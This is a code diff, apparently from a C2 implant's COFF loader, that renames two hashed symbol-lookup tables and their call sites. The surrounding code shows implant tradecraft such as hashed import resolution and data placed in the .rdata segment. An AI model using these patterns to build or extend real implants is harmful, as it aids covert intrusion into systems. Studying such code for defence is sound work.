@@ -3,7 +3,7 @@ namespace Objects {
 
     __code_seg(".rdata") void *wrapper_return = nullptr;
 
-    __code_seg(".rdata") _hash_map loader_wrappers[] = {
+    __code_seg(".rdata") _hash_map loader_map[] = {
         { .name = 0, .address = nullptr },
         { .name = 0, .address = nullptr },
         { .name = 0, .address = nullptr },
@@ -13,7 +13,7 @@ namespace Objects {
         { .name = 0, .address = nullptr },
     };
 
-    __code_seg(".rdata") _hash_map implant_wrappers[] = {
+    __code_seg(".rdata") _hash_map implant_map[] = {
         { .name = 0, .address = nullptr },
         { .name = 0, .address = nullptr },
         { .name = 0, .address = nullptr },
@@ -57,7 +57,7 @@ namespace Objects {
         if (Utils::HashStringA(sym_string, COFF_PREP_BEACON_SIZE) == COFF_PREP_BEACON) {
 
             function = sym_string + COFF_PREP_BEACON_SIZE;
-            success_(Memory::Scanners::MapScan(implant_wrappers, Utils::HashStringA(function, x_strlen(function)), pointer));
+            success_(Memory::Scanners::MapScan(implant_map, Utils::HashStringA(function, x_strlen(function)), pointer));
         }
         else if (Utils::HashStringA(sym_string, COFF_PREP_SYMBOL_SIZE) == COFF_PREP_SYMBOL) {
             bool import = Memory::Scanners::SymbolScan(sym_string, 0x24, x_strlen(sym_string));
@@ -83,7 +83,7 @@ namespace Objects {
                 function = sym_string + COFF_PREP_SYMBOL_SIZE;
 
                 x_trim(function, 0x40);
-                success_(Memory::Scanners::MapScan(loader_wrappers, Utils::HashStringA(function, x_strlen(function)), pointer));
+                success_(Memory::Scanners::MapScan(loader_map, Utils::HashStringA(function, x_strlen(function)), pointer));
             }
         }
         else if (Utils::HashStringA(sym_string, x_strlen(sym_string)) == COFF_INSTANCE) {
